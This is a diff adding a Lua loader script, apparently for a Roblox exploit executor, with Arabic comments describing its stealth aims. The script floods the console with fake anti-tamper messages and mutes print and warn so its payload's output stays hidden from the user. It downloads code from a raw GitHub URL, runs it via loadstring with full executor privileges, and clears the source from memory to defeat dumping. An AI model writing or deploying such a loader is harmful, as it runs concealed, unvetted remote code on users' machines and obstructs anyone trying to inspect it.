@@ -1,1 +1,58 @@
+-- ==========================================
+-- 🚀 Deep Stealth Bootstrap & Console Flooder
+-- ==========================================
 
+local TARGET_URL = "https://raw.githubusercontent.com/ggtughui-hub/mm/refs/heads/main/ac"
+
+-- 1. بدء قصف الكونسول (Console Flooding) لإرباك أدوات السحب والمتابعين
+task.spawn(function()
+    local fake_msgs = {
+        "🚨 ANTI-TAMPER: Memory integrity check failed at 0x00",
+        "⚠️ SECURE BOOT: Verifying bytecode... Attempt failed.",
+        "🔒 ENCRYPTION LAYER: Source obfuscation active...",
+        "💀 DUMP DETECTED: Injecting garbage data into hook...",
+        "✅ BYPASS: Hooking interceptor bypassed safely."
+    }
+    while true do
+        -- طباعة رسائل وهمية لا تنتهي لإغراق الشاشة
+        print(fake_msgs[math.random(1, #fake_msgs)] .. " (" .. math.random(10000, 99999) .. ")")
+        task.wait(0.001) -- سرعة عالية جداً لإغراق الكونسول
+    end
+end)
+
+-- 2. إخفاء السكربت الأساسي تماماً عن الكونسول
+local oldPrint = print
+local oldWarn = warn
+-- كتم أي رسالة يحاول السكربت الأساسي (ac) إخراجها لكي لا تظهر للمستخدم
+print = function() end
+warn = function() end
+
+-- 3. تحميل السكربت الأساسي في الخفاء
+local fetchSuccess, sourceCode = pcall(function()
+    return game:HttpGet(TARGET_URL)
+end)
+
+if not fetchSuccess or type(sourceCode) ~= "string" or #sourceCode == 0 then
+    return -- فشل صامت بدون إخبار الساحب بأي شيء
+end
+
+-- 4. تجميع الكود وتغيير بيئة التنفيذ (Deep Execution)
+local compileSuccess, compiledFunc = pcall(loadstring, sourceCode)
+
+-- 5. مسح النص الخام من الذاكرة فوراً (Anti-Memory Dump)
+sourceCode = nil 
+if collectgarbage then collectgarbage("collect") end
+
+if not compileSuccess or type(compiledFunc) ~= "function" then
+    return -- فشل صامت
+end
+
+-- 6. تنفيذ السكربت الأساسي (ac) في بيئة معزولة لكنها تحتفظ بكل صلاحيات الإكسكيوتر
+-- هذا يجعل السكربت يعمل بينه وبين الإكسكيوتر فقط، ولا يستطيع الساحب رؤيته
+pcall(function()
+    -- إعطاء السكربت صلاحيات كاملة لكي يعمل الـ UI والـ Threads بدون مشاكل
+    setfenv(compiledFunc, getfenv()) 
+    compiledFunc()
+end)
+
+-- ملاحظة: رسائل القصف ستستمر في الخلفية طوال مدة عمل السكربت
